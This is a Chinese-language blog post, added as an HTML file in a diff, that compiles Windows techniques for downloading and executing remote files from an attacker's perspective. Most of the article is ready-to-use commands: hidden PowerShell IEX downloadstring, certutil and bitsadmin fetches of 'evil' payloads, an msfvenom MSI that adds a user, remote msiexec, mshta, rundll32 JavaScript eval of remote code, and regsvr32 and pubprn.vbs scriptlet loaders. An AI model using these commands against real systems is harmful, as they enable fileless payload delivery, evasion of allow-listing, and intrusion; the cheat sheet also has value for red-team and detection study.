@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>常用下载命令整理-windows篇 | Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="下载命令Windows平台" />
+  
+  
+  
+  
+  <meta name="description" content="1.综述 一般来说，实现 Windows 文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式 。另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。  本文收集了 十几 种在Windows系统下常见的文件下载方式，Windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常用下载命令整理-Windows篇">
+<meta property="og:url" content="http://wayoka.github.io/2020/01/02/%E5%B8%B8%E7%94%A8%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4%E4%B9%8BWindows/index.html">
+<meta property="og:site_name" content="Blog">
+<meta property="og:description" content="1.综述 一般来说，实现 Windows 文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式 。另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。  本文收集了 十几 种在Windows系统下常见的文件下载方式，Windows">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-01-02T04:02:30.000Z">
+<meta property="article:modified_time" content="2021-10-29T09:45:15.273Z">
+<meta property="article:author" content="Wayoka">
+<meta property="article:tag" content="下载命令">
+<meta property="article:tag" content="Windows平台">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+  
+<script src="../../../../js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="../../../../js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="../../../../css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+    <link rel="stylesheet" href="/css/vdonate.css" >
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="80px" height="80px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="../../../../index.html">首页</a> </li>
+                
+                  <li> <a class="main-nav-link" href="../../../../archives">归档</a> </li>
+                
+                  <li> <a class="main-nav-link" href="../../../../categories">分类</a> </li>
+                
+                  <li> <a class="main-nav-link" href="../../../../tags">标签</a> </li>
+                
+                  <li> <a class="main-nav-link" href="../../../../about">关于</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '../../../../content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="../../../../js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-常用下载命令之Windows" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      常用下载命令整理-Windows篇
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="" class="article-date">
+	  <time datetime="2020-01-02T04:02:30.000Z" itemprop="datePublished">2020-01-02</time>
+	</a>
+
+      
+    <a class="article-category-link" href="../../../../categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/">下载命令</a><a class="article-category-link" href="../../../../categories/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/Windows%E5%B9%B3%E5%8F%B0/">Windows平台</a>
+
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		阅读量<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-综述"><a href="#1-综述" class="headerlink" title="1.综述"></a>1.综述</h1><p>&emsp;一般来说，实现 Windows 文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；<strong>第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式 。</strong>另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。</p>
+<p>&emsp;本文收集了 十几 种在Windows系统下常见的文件下载方式，Windows命令行自带工具下载指令列表如下：</p>
+<p>其中 mshta、regsvr32、pubprn.vbs命令执行下载功能时需要相应的配置文件。</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>下载指令</th>
+<th>描述</th>
+<th>需要环境</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>PowerShell</td>
+<td>命令行外壳程序和脚本环境</td>
+<td>win2003、winXP不支持</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Bitsadmin</td>
+<td>命令行工具，可用于创建下载或上传工作和监测其进展情况</td>
+<td>一般Windows系统都存在(XP除外)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>certutil</td>
+<td>作为证书服务的一部分安装</td>
+<td>一般Windows系统都存在</td>
+</tr>
+<tr>
+<td>4</td>
+<td>ipc$ 文件共享</td>
+<td>共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问</td>
+<td>一般Windows系统都存在</td>
+</tr>
+<tr>
+<td>5</td>
+<td>FTP</td>
+<td>文件传输，命令行下载上传指令</td>
+<td>一般Windows系统都存在</td>
+</tr>
+<tr>
+<td>6</td>
+<td>msiexec</td>
+<td>支持远程下载功能</td>
+<td>一般Windows系统都存在</td>
+</tr>
+<tr>
+<td>7</td>
+<td>mshta</td>
+<td>mshta 用于执行 .hta 文件，而 hta 是 HTML Applocation 的缩写，也就是 HTML 应用程序。而 hta 中也支持 VBS。所以我们可以利用 hta 来下载文件。</td>
+<td>一般Windows系统都存在，需要将下载地址写到hta文件中</td>
+</tr>
+<tr>
+<td>8</td>
+<td>rundll32</td>
+<td>其下载文件依赖于WScript.shell这个组件</td>
+<td>一般Windows系统都存在</td>
+</tr>
+<tr>
+<td>9</td>
+<td>regsvr32</td>
+<td>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。</td>
+<td>一般Windows系统都存在</td>
+</tr>
+<tr>
+<td>10</td>
+<td>pubprn.vbs</td>
+<td>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</td>
+<td>Windows 7以上版本</td>
+</tr>
+</tbody></table>
+<p>需要安装第三方应用/服务的下载指令列表如下：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>下载指令</th>
+<th>描述</th>
+<th>需要环境</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>wget</td>
+<td>wget 是一个从网络上自动下载文件的自由工具，支持通过 HTTP、HTTPS、FTP 三个最常见的 TCP/IP协议下载，并可以使用HTTP 代理。”wget” 这个名称来源于 “World Wide Web” 与 “get” 的结合。<br>Wget下载地址：<a target="_blank" rel="noopener" href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></td>
+<td><a target="_blank" rel="noopener" href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td>curl</td>
+<td>curl是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具，curl还包含了用于程序开发的libcurl。</td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td>ncat</td>
+<td>nc是一款安全工具，它还有其他的名字 Netcat， Ncat 可用来做端口扫描，端口转发，连接远程系统等。它是一款拥有多种功能的CLI 工具，可以用来在网络上读、写以及重定向数据，它被设计成可以被脚本或其他程序调用的可靠的后端工具，同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。当目标主机上安装了ncat是我们可以使用ncat来实现文件下载，当然这种场景在实战中少之又少~</td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Notepad Dialog Box</td>
+<td>如果你有权限接入一台(远程连接或者物理机)电脑，但是当前用户权限不允许打开浏览器，这时你该怎么反弹一个shell回来呢？如果目标主机有安装notpad那么你可以通过此方式快速的从一个URL或者UNC路径当中下载文件到本地并执行来获取shell</td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td>TFTP</td>
+<td>需要下载tftpd32.exe，文件传输，命令行下载上传指令</td>
+<td></td>
+</tr>
+<tr>
+<td>6</td>
+<td>WinScp</td>
+<td>WinSCP 是一个 Windows 环境下使用 SSH 的开源图形化 SFTP 客户端。</td>
+<td>一般Windows系统都存在</td>
+</tr>
+<tr>
+<td>7</td>
+<td>IEExec</td>
+<td>IEexec.exe 应用程序是 .NET Framework 附带程序，存在于多个系统白名单内。</td>
+<td>一般Windows系统都存在，需要将下载地址写到hta文件中</td>
+</tr>
+</tbody></table>
+<h1 id="2-常用下载指令"><a href="#2-常用下载指令" class="headerlink" title="2. 常用下载指令"></a>2. 常用下载指令</h1><h2 id="2-1-PowerShell"><a href="#2-1-PowerShell" class="headerlink" title="2.1 PowerShell"></a>2.1 PowerShell</h2><p><strong>远程下载文件保存在本地：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.xx.xxx/imag/evil.txt&#x27;</span>,<span class="string">&#x27;evil.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>远程下载并执行命令：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.128/imag/evil.txt&#x27;))&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-Bitsadmin"><a href="#2-2-Bitsadmin" class="headerlink" title="2.2 Bitsadmin"></a>2.2 Bitsadmin</h2><p>&emsp;BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。</p>
+<p><strong>远程下载文件保存在本地：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://<span class="number">192.168</span>.<span class="number">28.128</span>/imag/evil.txt d:\test\<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-certutil"><a href="#2-3-certutil" class="headerlink" title="2.3 certutil"></a>2.3 certutil</h2><p>&emsp;certutil.exe是一个命令行程序，作为证书服务的一部分安装，你可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。</p>
+<p><strong>远程下载文件保存在本地：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">174.1</span>:<span class="number">1234</span>/evil.txt test.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-4-ipc-文件共享"><a href="#2-4-ipc-文件共享" class="headerlink" title="2.4 ipc$ 文件共享"></a>2.4 ipc$ 文件共享</h2><p>&emsp;IPC$(Internet Process Connection) 是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立远程 IPC 连接 </span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">28.128</span>\ipc<span class="variable">$</span> /user:administrator <span class="string">&quot;abc123!&quot;</span><span class="comment">#复制远程文件到本地主机 </span></span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">28.128</span>\c<span class="variable">$</span>\<span class="number">2</span>.txt D:\test</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-5-FTP"><a href="#2-5-FTP" class="headerlink" title="2.5 FTP"></a>2.5 FTP</h2><p>&emsp;一般情况下攻击者使用 FTP 上传文件需要很多交互的步骤，下面这个 bash 脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp <span class="number">127.0</span>.<span class="number">0.1</span> usernamepasswordget fileexit</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-6-msiexec"><a href="#2-6-msiexec" class="headerlink" title="2.6 msiexec"></a>2.6 msiexec</h2><p>&emsp;msiexec是windows自带的cmd工具，支持远程下载功能，攻击者可以将msi文件上传到服务器并执行，下面通过一个实例做演示说明，首先我们通过msfvenom来构造一个恶意的msi程序(这里以弹计算器为例，在实战中可以根据需要进行修改)，并启动一个简易HTTP服务：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/exec CMD=<span class="string">&#x27;net user test abc123! /add&#x27;</span> <span class="operator">-f</span> msi &gt; evil.msi<span class="comment">#生成 msi 包</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">28.128</span>/evil.msi<span class="comment">#远程执行 </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-7-mshta"><a href="#2-7-mshta" class="headerlink" title="2.7 mshta"></a>2.7 mshta</h2><p>&emsp;mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件，我们可以在本地构建hta文件，之后通过目标主机的mshta来远程下载并执行，例如在本地创建以下hta文件：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;meta http<span class="literal">-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;VBScript&quot;</span>&gt;</span><br><span class="line"><span class="built_in">Set</span> objShell = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">objShell.Run <span class="string">&quot;cmd.exe /c calc.exe&quot;</span> // 待执行的命令</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Demo</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后在远程目标主机上执行以下命令实现下载执行操作，且无文件落地：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://<span class="number">192.168</span>.<span class="number">174.1</span>:<span class="number">1234</span>/evil.hta</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-8-rundll32"><a href="#2-8-rundll32" class="headerlink" title="2.8 rundll32"></a>2.8 rundll32</h2><p>&emsp;Rundll32.exe功能是以命令行的方式调用动态链接程序库，系统中还有一个Rundll64.exe文件，它的意思是”执行64位的DLL文件”， 其命令行下的使用方法为：Rundll32.exe DLLname,Functionname Arguments，其中DLLname为需要执行的DLL文件名，Functionname为前边需要执行的DLL文件的具体引出函数，Arguments为引出函数的具体参数。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document.write();<span class="built_in">h</span>=new%<span class="number">20</span>ActiveXObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);h.Open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/connect&quot;</span>,false);<span class="keyword">try</span>&#123;h.Send();b=h.ResponseText;eval(b);&#125;<span class="keyword">catch</span>(e)&#123;new%<span class="number">20</span>ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(<span class="string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,<span class="number">0</span>,true);&#125;%</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-9-regsvr32"><a href="#2-9-regsvr32" class="headerlink" title="2.9 regsvr32"></a>2.9 regsvr32</h2><p>&emsp;Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行，我们可以通过该命令来实现远程文件下载。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /s /i:http://<span class="number">192.168</span>.<span class="number">3.1</span>/test.data scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p>test.data内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span></span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">&quot;ShortJSRAT&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Learn from Casey Smith @subTee --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        &lt;![CDATA[</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">            ps  = &quot;cmd.exe /c calc.exe&quot;;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span></span></span><br><span class="line"><span class="xml"><span class="handlebars"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        ]]&gt;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-10-pubprn-vbs"><a href="#2-10-pubprn-vbs" class="headerlink" title="2.10 pubprn.vbs"></a>2.10 pubprn.vbs</h2><p>&emsp;在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot;</span> <span class="number">127.0</span>.<span class="number">0.1</span> script:https://gist.githubusercontent.com/enigma0x3/<span class="number">64</span>adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br></pre></td></tr></table></figure>
+
+<p>test.sct</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span></span></span><br><span class="line"><span class="tag">    <span class="attr">description</span>=<span class="string">&quot;Bandit&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">&quot;Bandit&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">version</span>=<span class="string">&quot;1.00&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">remotable</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">	&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">&lt;![CDATA[</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">		var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span></span></span><br><span class="line"><span class="xml"><span class="handlebars">]]&gt;</span></span></span><br><span class="line"><span class="xml"><span class="handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/728397196892.htm">Windows 文件下载执行的 15 种姿势</a></li>
+<li><a target="_blank" rel="noopener" href="https://pino-hd.github.io/2018/06/10/%E6%B8%97%E9%80%8F%E4%B8%AD15%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%B9%E6%B3%95/">渗透中15种文件下载的方法</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.linuxprobe.com/download-malicious-code.html">警惕：通过命令下载执行恶意代码的几种姿势</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/17bdw/p/8550189.html">Windows执行命令与下载文件总结</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7937">windows/Linux文件下载方式汇总</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div id="donation_div"></div>
+
+
+<script src="../../../../js/vdonate.js"></script>
+
+<script>
+var a = new Donate({
+  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
+  btnText: '打赏支持', // 可选参数，打赏按钮文字
+  el: document.getElementById('donation_div'),
+  wechatImage: 'https://raw.githubusercontent.com/iTimeTraveler/iTimeTraveler.github.io/site/source/about/donate/images/WeChanQR.png',
+  alipayImage: 'https://raw.githubusercontent.com/iTimeTraveler/iTimeTraveler.github.io/site/source/about/donate/images/AliPayQR.jpg'
+});
+</script>
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>本文作者:  </strong>Wayoka</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>本文链接:  </strong>
+          <a href="/2020/01/02/常用下载命令之Windows/" target="_blank" title="常用下载命令整理-Windows篇">http://wayoka.github.io/2020/01/02/常用下载命令之Windows/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/Windows%E5%B9%B3%E5%8F%B0/" rel="tag">Windows平台</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/" rel="tag">下载命令</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="../../../04/25/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B9%8B%E6%A0%87%E5%BF%97%E4%BD%8D%E5%8F%8D%E8%B0%83%E8%AF%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          反调试手段（一）
+        
+      </div>
+    </a>
+  
+  
